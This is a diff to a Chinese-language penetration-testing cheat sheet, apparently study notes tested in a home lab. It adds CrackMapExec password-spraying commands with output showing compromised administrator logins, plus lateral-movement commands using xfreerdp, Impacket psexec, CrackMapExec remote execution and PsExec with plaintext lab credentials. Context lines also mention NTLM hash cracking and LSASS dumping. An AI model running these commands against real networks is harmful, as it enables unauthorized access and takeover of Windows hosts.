@@ -311,7 +311,23 @@ $ file [filename]
                 $ cp /usr/share/wordlists/rockyou.txt ./
                 $ hashcat -a 0 -m 1000 ntlm.hash rockyou.txt --force
                 ```
-    * Password Spraying(用猜的)用一組密碼去爆所有的帳號
+    * Password Spraying(用猜的)用一組密碼去爆所有的帳號: [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) - 結合各種功能的內網滲透神器
+        ```bash
+        $ crackmapexec <protocol> <target(s)> -u <a file or string only> -p <a file or string only>
+
+        # For example
+        $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd
+        $ crackmapexec smb 10.10.10.100 -u ~/file_usernames -p ~/file_passwords
+        $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd --local-auth
+        $ crackmapexec smb <filename> -u administrator -p Passw0rd --local-auth
+
+        # 實際的例子
+        $ $ crackmapexec smb 192.168.222.128/24 -u administrator -p 1qaz@WSX3edc             
+        SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
+        SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
+        SMB         192.168.222.129 445    DESKTOP-G95U93T  [+] kuma.org\\administrator:1qaz@WSX3edc (Pwn3d!)
+        SMB         192.168.222.128 445    WIN-818G5VCOLJO  [+] kuma.org\\administrator:1qaz@WSX3edc (Pwn3d!)
+        ```
     * 記憶體(lsass): 透過Mimikatz取得Local Admin的NTLM
         1. 把lsass dump下來
             * 找到Local Security Authority Process(LSASS)，右鍵選**建立傾印檔案**，就可以直接dump memory
@@ -355,10 +371,37 @@ $ file [filename]
     * xfreerdp
         ```bash
         $ sudo apt install freerdp2-x11 -y
+        $ ipconfig # check win10 ip
+        $ xfreerdp /d:<domain> /p:<passwd> /v:<ip> /u:<user>
+        $ xfreerdp /d:kuma.org /p:1qaz@WSX3edc /v:192.168.222.129 /u:administrator
         ```
     * [Libfreerdp](https://packages.debian.org/sid/libfreerdp-client2-2)
+    * Impacket
+        ```bash
+        # Set up & Install
+        $ git clone https://github.com/fortra/impacket.git
+        $ cd impacket
+        $ conda activate py3.7 # Recommended to install it in conda
+        $ pip3 install -r requirements.txt
+        $ python3 setup.py install
+                
+        # Cheat-Sheet
+        $ conda activate py3.7
+        $ proxychains psexec.py <username>:<password>@<ip> whoami
+        $ proxychains psexec.py kuma\administrators:1qaz@WSX3edc@192.168.222.129 dir
+        ```
+    * CrackMapExec
+        ```bash
+        $ crackmapexec smb <IP> -u <username> -p <password --exec-method smbexec -x '<command>'
+        # exec-method支援以下方法: mmcexec, smbexec, wmiexec, atexec
+        $ crackmapexec smb 192.168.222.129 -u administrator -p 1qaz@WSX3edc --exec-method smbexec -x 'dir C:\tools'
+        ```
 * Windows
     * Psexec.exe
+        ```bash
+        $ PsExec.exe -i \\<Remote IP> -accepteula -u <domain>\\<Remote Username> -p <Remote Password> cmd
+        $ PsExec.exe -i \\192.168.222.129 -accepteula -u kuma.org\\administrator -p 1qaz@WSX3edc cmd
+        ```
     
 #### Wireless Related
 * 大部分都會用到[Aircrack](https://sectools.tw/aircrack-ng-%E6%95%99%E5%AD%B8/)這個工具
